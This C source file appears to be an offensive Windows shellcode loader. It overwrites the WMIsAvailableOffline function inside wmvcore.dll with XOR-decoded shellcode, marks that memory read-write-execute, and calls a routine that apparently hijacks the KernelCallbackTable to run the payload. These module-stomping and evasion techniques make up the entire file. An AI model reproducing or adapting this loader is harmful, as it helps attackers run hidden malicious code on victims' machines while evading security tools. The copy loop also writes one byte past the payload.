// PROGRAMMED BY ORCA
#include "utils.h"
#include "connect.h"
#include "shellcode.h"

#define CLEAN TRUE



BOOL InjectAndRwx(HANDLE hProcess, PVOID ShellcodeLocation, SIZE_T sizeofshellcode);



void main() {
	BOOL Success;
	SIZE_T sizeofshellcode = sizeof(rawData);
	
	HANDLE hProcess, hEvent;
	PVOID  WMIsAO_ADD;
	HMODULE wmvcoreHMandle, User;
	User = LoadLibraryA("user32.dll");
	wmvcoreHMandle = LoadLibraryA("wmvcore.dll");

	

	hProcess = GetCurrentProcess();
	WMIsAO_ADD = GetProcAddress(wmvcoreHMandle, "WMIsAvailableOffline");
	printf("[i] WMIsAvailableOffline ADD ::: %0-16p \n", WMIsAO_ADD);

	InjectAndRwx(hProcess, WMIsAO_ADD, sizeofshellcode);

	//printf("[+] Press Any Key To HijackKCT ...\n");
	//getchar();
	hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	load_shellcode(WMIsAO_ADD, sizeofshellcode);
	Get_fnDWViaKCTAndHijack(GetCurrentProcess(), sizeofshellcode,  WMIsAO_ADD, rawData, CLEAN);
	WaitForSingleObject(hEvent, INFINITE);
	printf("[+] Press Any Key To exit ...\n");
	getchar();
}


VOID Write(SIZE_T payload_len, PVOID* Destination, unsigned char* payload, BYTE key) {
	int n = 0;
	for (size_t i = 0; i <= payload_len; i++) {
		FillMemory(
			(LPVOID)((ULONG_PTR)Destination + n),
			0x1,
			(BYTE)(payload[i] ^ key)
		);
		n++;
	}
}

BOOL InjectAndRwx(HANDLE hProcess, PVOID ShellcodeLocation, SIZE_T sizeofshellcode) {
	DWORD Old;
	SIZE_T dwBytesCopied;
	BOOL Success;
	
	Success = VirtualProtectEx(hProcess, ShellcodeLocation, sizeofshellcode, PAGE_READWRITE, &Old);
	if (Success == FALSE){
		printf("[!] [1] VirtualProtectEx FAILED with Error : %d \n", GetLastError());
		return FALSE;
	}

	//Success = WriteProcessMemory(hProcess, ShellcodeLocation, &rawData, sizeofshellcode, &dwBytesCopied);
	//printf("[+] Wrote: %ld\n", dwBytesCopied);
	//if (Success == FALSE) {
	//	printf("[!] WriteProcessMemory FAILED with Error : %d \n", GetLastError());
	//	return FALSE;
	//}
	Write(sizeofshellcode, ShellcodeLocation, rawData, key);

	
	Success = VirtualProtectEx(hProcess, ShellcodeLocation, sizeofshellcode, PAGE_EXECUTE_READWRITE, &Old);
	if (Success == FALSE) {
		printf("[!] [2] VirtualProtectEx FAILED with Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

